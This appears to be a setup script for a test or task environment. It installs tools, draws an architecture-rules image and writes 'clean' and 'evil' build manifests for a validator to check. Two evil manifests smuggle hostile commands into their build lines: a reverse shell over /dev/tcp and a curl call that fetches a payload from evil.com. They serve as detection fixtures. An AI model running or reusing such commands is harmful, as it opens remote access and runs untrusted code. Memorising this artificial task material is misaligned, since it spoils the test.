#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip tesseract-ocr
    pip3 install pytest Pillow

    mkdir -p /app/corpora/clean /app/corpora/evil

    # Generate the architecture image using Python and Pillow
    cat << 'EOF' > /app/make_image.py
from PIL import Image, ImageDraw
img = Image.new('RGB', (800, 400), color=(255, 255, 255))
d = ImageDraw.Draw(img)
text = """ALLOWED_EDGES:
Frontend -> APIGateway
APIGateway -> AuthService
APIGateway -> UserDatabase
AuthService -> AuthDatabase"""
d.text((20, 20), text, fill=(0, 0, 0))
img.save('/app/system_architecture.png')
EOF
    python3 /app/make_image.py
    rm /app/make_image.py

    # Create clean corpus files
    cat << 'EOF' > /app/corpora/clean/build1.manifest
Target: Frontend
Depends-On: APIGateway
Cmd: npm run build
EOF

    cat << 'EOF' > /app/corpora/clean/build2.manifest
Target: APIGateway
Depends-On: AuthService, UserDatabase
Cmd: go build -o bin/api main.go
EOF

    # Create evil corpus files
    cat << 'EOF' > /app/corpora/evil/build1.manifest
Target: Frontend
Depends-On: UserDatabase
Cmd: npm run build
EOF

    cat << 'EOF' > /app/corpora/evil/build2.manifest
Target: APIGateway
Depends-On: AuthService
Cmd: go build -o bin/api main.go; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
EOF

    cat << 'EOF' > /app/corpora/evil/build3.manifest
Target: AuthService
Depends-On: AuthDatabase
Cmd: python3 setup.py `curl -s http://evil.com/payload`
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user /app
